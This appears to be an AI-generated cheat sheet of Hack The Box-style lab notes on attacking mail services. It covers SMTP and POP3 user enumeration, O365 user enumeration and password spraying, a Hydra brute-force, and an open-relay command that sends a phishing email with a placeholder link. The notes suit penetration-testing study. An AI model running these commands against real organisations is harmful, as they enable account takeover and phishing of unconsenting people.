
---

# SMTP & Email Service Enumeration Notes

## Enumeration

### Host – MX Records

```bash
host -t MX hackthebox.eu
```

### Host – A Records

```bash
host -t A mail1.inlanefreight.htb.
```

### DIG – MX Records

```bash
dig mx plaintext.do | grep "MX" | grep -v ";"
```

### Nmap – Mail Default Scripts

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

---

## Misconfigured SMTP Authentication

- SMTP may allow:
    
    - Anonymous authentication
        
    - User enumeration
        
- Risks:
    
    - User discovery
        
    - Brute-force attacks
        
    - Phishing campaigns
        

---

## User Enumeration via SMTP Commands

### VRFY Command

Check if a user exists.

```bash
telnet 10.10.110.20 25
VRFY root
```

### EXPN Command

Expand mailing lists or aliases.

```bash
telnet 10.10.110.20 25
EXPN support-team
```

### RCPT TO Command

Verify recipients during handshake.

```bash
telnet 10.10.110.20 25
MAIL FROM:test@htb.com
RCPT TO:john
```

### POP3 Enumeration (USER Command)

Check for valid POP3 users.

```bash
telnet 10.10.110.20 110
USER john
```

---

## Automating Enumeration

### smtp-user-enum

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

- `-M` → Mode (VRFY, EXPN, RCPT)
    
- `-U` → Userlist file
    
- `-D` → Target domain
    
- `-t` → Target IP
    

---

## Cloud Enumeration

### O365 Spray – Validate Domain

```bash
python3 o365spray.py --validate --domain msplaintext.xyz
```

Check if a domain is using O365.

### O365 Spray – Enumerate Users

```bash
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

- Enumerates potential users
    
- Outputs valid accounts to file
    

---

## Password Attacks

### Hydra – POP3 Password Attack

```bash
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

### O365 Spray – Password Spraying

```bash
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

---

## Protocol-Specific Attacks

### Open Relay

- SMTP server relays unauthenticated emails.
    
- Improper config allows anyone to send mail.
    
- Abused for phishing and spoofing attacks.
    

#### Nmap – Open Relay Test

```bash
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

#### Sending Mail via Open Relay

```bash
swaks --from notifications@inlanefreight.com \
      --to employees@inlanefreight.com \
      --header 'Subject: Company Notification' \
      --body 'Hi All, complete the survey: http://mycustomphishinglink.com/' \
      --server 10.10.11.213
```

---

## Accessing Email Services

### POP3 Access with Netcat

```bash
nc -nv STMIP 110
user simon
pass 8Ns8j1b!23hs4921smHzwn
```

### Enumerating After Login

```bash
# List messages
LIST

# Retrieve message
RETR 1
```

#### Example Session

```bash
telnet int-ftp.inlanefreight.htb 110
user simon
pass 8Ns8j1b!23hs4921smHzwn
LIST
RETR 1
```

Message retrieved may include sensitive information, e.g. SSH keys.

---

Would you like me to also build a **TL;DR summary section** at the top (key commands + use cases) so this works like a one-page cheat sheet for quick recall?